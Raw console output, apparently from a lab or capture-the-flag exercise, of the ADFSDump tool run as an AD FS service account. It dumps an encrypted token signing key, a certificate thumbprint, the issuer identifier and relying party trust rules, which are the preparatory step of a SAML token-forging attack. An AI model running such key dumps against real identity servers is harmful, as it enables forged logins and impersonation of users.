
C:\Users\adfs_svc\Documents>ADFSDump.exe                                                                                                                                                                       
## Extracting Private Key from Active Directory Store                                                                                                                                                          
[-] Domain is 0x0security.local                                                                                                                                                                                
!!! Exception getting private key: System.DirectoryServices.DirectoryServicesCOMException (0x80072020): An operations error occurred.                                                                          
   at System.DirectoryServices.DirectoryEntry.Bind(Boolean throwIfFail)                                                                                                                                        
   at System.DirectoryServices.DirectoryEntry.Bind()                                                                                                                                                           
   at System.DirectoryServices.DirectoryEntry.get_AdsObject()                                                                                                                                                  
   at System.DirectoryServices.DirectorySearcher.FindAll(Boolean findMoreThanOne)                                                                                                                              
   at ADFSDump.ActiveDirectory.ADSearcher.GetPrivKey(Dictionary`2 arguments)                                                                                                                                   
!!! Are you sure you are running as the AD FS service account?                                                                                                                                                 
## Reading Encrypted Signing Key from Database                                                                                                                                                                 
[-] Encrypted Token Signing Key Begin                                                                                                                                                                          
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
[-] Encrypted Token Signing Key End

[-] Certificate value: CF7F4D9BEE76758828D4F908F6CED5AD8C92E569
[-] Store location value: CurrentUser
[-] Store name value: My

## Reading The Issuer Identifier
[-] Issuer Identifier: http://adfs.0x0security.local/adfs/services/trust
[-] Detected AD FS 2019
[-] Uncharted territory! This might not work...
## Reading Relying Party Trust Information from Database
[-] 
splunk.gigantichosting                                                                                                                                                                                         
 ==================                                                                                                                                                                                            
    Enabled: True                                                                                                                                                                                              
    Sign-In Protocol: SAML 2.0                                                                                                                                                                                 
    Sign-In Endpoint: https://splunk.gigantichosting.local:8000/saml/acs                                                                                                                                       
    Signature Algorithm: http://www.w3.org/2000/09/xmldsig#rsa-sha1                                                                                                                                            
    SamlResponseSignatureType: 1;                                                                                                                                                                              
    Identifier: splunk.gigantichosting                                                                                                                                                                         
    Access Policy: <PolicyMetadata xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">                                                                   
  <RequireFreshAuthentication>false</RequireFreshAuthentication>                                                                                                                                               
  <IssuanceAuthorizationRules>                                                                                                                                                                                 
    <Rule>                                                                                                                                                                                                     
      <Conditions>
        <Condition i:type="AlwaysCondition">
          <Operator>IsPresent</Operator>
        </Condition>
      </Conditions>
    </Rule>
  </IssuanceAuthorizationRules>
</PolicyMetadata>


    Access Policy Parameter: 
     
    Issuance Rules: @RuleTemplate = "MapClaims"
@RuleName = "nameid_adfs"
c:[Type == "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn"]
 => issue(Type = "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier", Issuer = c.Issuer, OriginalIssuer = c.OriginalIssuer, Value = c.Value, ValueType = c.ValueType, Properties["http://sch
emas.xmlsoap.org/ws/2005/05/identity/claimproperties/format"] = "urn:oasis:names:tc:SAML:2.0:nameid-format:transient");

@RuleTemplate = "LdapClaims"
@RuleName = "attrs"
c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname", Issuer == "AD AUTHORITY"]
 => issue(store = "Active Directory", types = ("realName", "mail", "http://schemas.microsoft.com/ws/2008/06/identity/claims/role"), query = ";displayName,mail,tokenGroups;{0}", param = c.Value);
 [-] 
servicedesk
 ==================
    Enabled: True
    Sign-In Protocol: SAML 2.0
    Sign-In Endpoint: https://servicedesk.gigantichosting.local/SamlResponseServlet
    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
    SamlResponseSignatureType: 1;
    Identifier: ME_29472ca9-86f2-4376-bc09-c51aa974bfef
    Access Policy: <PolicyMetadata xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2012/04/ADFS">
  <RequireFreshAuthentication>false</RequireFreshAuthentication>
  <IssuanceAuthorizationRules>
    <Rule>
      <Conditions>
        <Condition i:type="AlwaysCondition">
          <Operator>IsPresent</Operator>
        </Condition>
      </Conditions>
    </Rule>
  </IssuanceAuthorizationRules>
</PolicyMetadata>


    Access Policy Parameter: 
    
    Issuance Rules: @RuleTemplate = "MapClaims"
@RuleName = "SDP NameID"
c:[Type == "http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname"]
 => issue(Type = "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier", Issuer = c.Issuer, OriginalIssuer = c.OriginalIssuer, Value = c.Value, ValueType = c.ValueType, Properties["http://schemas.xmlsoap.org/ws/2005/05/identity/claimproperties/format"] = "urn:oasis:names:tc:SAML:2.0:nameid-format:transient");
